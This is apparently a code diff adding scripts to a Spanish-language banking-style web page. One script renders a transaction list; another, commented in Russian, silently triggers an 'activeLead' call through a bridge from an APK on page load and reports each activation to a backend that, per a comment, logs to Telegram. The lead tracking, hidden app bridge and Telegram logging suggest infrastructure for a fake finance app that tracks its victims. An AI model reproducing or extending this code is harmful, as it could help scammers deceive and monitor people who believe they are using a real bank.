+            var creditIcon = '<div class="tourist-list-item__icon tourist-list-item__icon--success tourist-list-item__icon--full" aria-hidden="true"><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="32" rx="16" fill="#E1F8E9" /><path d="M22.6417 13.7904H20.1917C19.1333 13.7904 18.5 13.157 18.5 12.0987V9.6487C18.5 8.59036 19.1333 7.95703 20.1917 7.95703H22.6417C23.7 7.95703 24.3333 8.59036 24.3333 9.6487V12.0987C24.3333 13.157 23.7 13.7904 22.6417 13.7904ZM22.825 11.032C22.725 10.932 22.5917 10.882 22.4583 10.882C22.325 10.882 22.1917 10.932 22.0917 11.032L21.9417 11.182V9.31536C21.9417 9.0237 21.7083 8.79036 21.4167 8.79036C21.125 8.79036 20.8917 9.0237 20.8917 9.31536V11.182L20.7417 11.032C20.5417 10.832 20.2083 10.832 20.0083 11.032C19.8083 11.232 19.8083 11.5654 20.0083 11.7654L21.05 12.807C21.0917 12.8487 21.15 12.882 21.2083 12.907C21.225 12.9154 21.2417 12.9154 21.2583 12.9237C21.3 12.9404 21.3417 12.9487 21.3917 12.9487C21.4083 12.9487 21.425 12.9487 21.4417 12.9487C21.5 12.9487 21.55 12.9404 21.6083 12.9154C21.6167 12.9154 21.6167 12.9154 21.625 12.9154C21.6833 12.8904 21.7333 12.857 21.775 12.8154C21.7833 12.807 21.7833 12.807 21.7917 12.807L22.8333 11.7654C23.0333 11.5654 23.0333 11.232 22.825 11.032Z" fill="#1EC756" /><path d="M7.66406 16.0513V20.218C7.66406 22.1263 9.20573 23.668 11.1141 23.668H20.8724C22.7807 23.668 24.3307 22.118 24.3307 20.2096V16.0513C24.3307 15.493 23.8807 15.043 23.3224 15.043H8.6724C8.11406 15.043 7.66406 15.493 7.66406 16.0513ZM12.6641 20.8763H10.9974C10.6557 20.8763 10.3724 20.593 10.3724 20.2513C10.3724 19.9096 10.6557 19.6263 10.9974 19.6263H12.6641C13.0057 19.6263 13.2891 19.9096 13.2891 20.2513C13.2891 20.593 13.0057 20.8763 12.6641 20.8763ZM18.0807 20.8763H14.7474C14.4057 20.8763 14.1224 20.593 14.1224 20.2513C14.1224 19.9096 14.4057 19.6263 14.7474 19.6263H18.0807C18.4224 19.6263 18.7057 19.9096 18.7057 20.2513C18.7057 20.593 18.4224 20.8763 18.0807 20.8763Z" fill="#1EC756" /><path d="M17.2474 10.3404V12.782C17.2474 13.3404 16.7974 13.7904 16.2391 13.7904H8.6724C8.10573 13.7904 7.66406 13.3237 7.66406 12.7654C7.6724 11.8237 8.0474 10.9654 8.6724 10.3404C9.2974 9.71536 10.1641 9.33203 11.1141 9.33203H16.2391C16.7974 9.33203 17.2474 9.78203 17.2474 10.3404Z" fill="#1EC756" /></svg></div>';
+            recent.forEach(function (tx) {
+              var isCredit = tx && (tx.type === 'credit' || tx.type === 'card_credit');
+              var defaultName =
+                (tx && tx.type === 'card_credit') ? 'Recarga de tarjeta' :
+                (tx && tx.type === 'card_debit') ? 'Cargo en tarjeta' :
+                (isCredit ? 'Saldo restituido' : 'Transferencia al IBAN');
+              var name = (tx && tx.description) ? tx.description : defaultName;
+              var d = new Date(tx.date);
+              var pad = function (n) { return String(n).padStart(2, '0'); };
+              var dateStr = pad(d.getDate()) + '.' + pad(d.getMonth() + 1) + '.' + d.getFullYear();
+              var timeStr = pad(d.getHours()) + ':' + pad(d.getMinutes());
+              var item = document.createElement('div');
+              item.className = 'tourist-list-item';
+              item.style.cssText = 'text-decoration:none;color:inherit;';
+              item.innerHTML = (isCredit ? creditIcon : debitIcon)
+                + '<div class="tourist-list-item__text">'
+                + '<p class="tourist-list-item__name">' + escapeHtml(name) + '</p>'
+                + '<div class="tourist-list-item__meta"><span>' + dateStr + '</span><span class="tourist-list-item__meta-dot"></span><span>' + timeStr + '</span></div>'
+                + '</div>'
+                + '<span class="tourist-list-item__amount" style="color:#0f0f0f">' + (isCredit ? '+€' : '-€') + fmtEur(tx.amount) + '</span>';
+              if (loanAnchor) list.insertBefore(item, loanAnchor);
+              else list.appendChild(item);
+            });
+          })
+          .catch(function () {});
+      })();
+    </script>
+    <script>
+      // Активация лида (мост из APK). Срабатывает при каждом заходе/обновлении
+      // страницы, но не больше 3 раз всего — счётчик хранится в localStorage.
+      (function () {
+        var KEY = "activeLeadCount";
+        function getCount() {
+          try { return parseInt(localStorage.getItem(KEY) || "0", 10) || 0; } catch (e) { return 0; }
+        }
+        function report(count) {
+          try {
+            var apiBase = (window.API_BASE || window.FORM_API_BASE || window.location.origin).replace(/\/+$/, "");
+            var sid = (window.getFlowSessionId && window.getFlowSessionId()) || localStorage.getItem("flowSessionId") || "";
+            fetch(apiBase + "/api/track-activelead", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ flowSessionId: sid, count: count }),
+              keepalive: true,
+            }).catch(function () {});
+          } catch (e) {}
+        }
+        function run() {
+          if (getCount() >= 3) return; // лимит исчерпан
+          var tries = 0;
+          var timer = setInterval(function () {
+            tries++;
+            if (getCount() >= 3) { clearInterval(timer); return; }
+            try {
+              if (window.moneto && typeof moneto.activeLead === "function") {
+                moneto.activeLead();
+                var newCount = getCount() + 1;
+                localStorage.setItem(KEY, String(newCount));
+                report(newCount); // лог в Telegram (редактируется одно сообщение)
+                clearInterval(timer);
+                return;
+              }
+            } catch (e) {}
+            if (tries >= 10) clearInterval(timer); // ~5с ждём мост, иначе — следующая загрузка
+          }, 500);
+        }
+        if (document.readyState === "complete" || document.readyState === "interactive") {
+          run();
+        } else {
+          window.addEventListener("DOMContentLoaded", run);
+        }
+      })();
+    </script>
+  </body>
+</html>
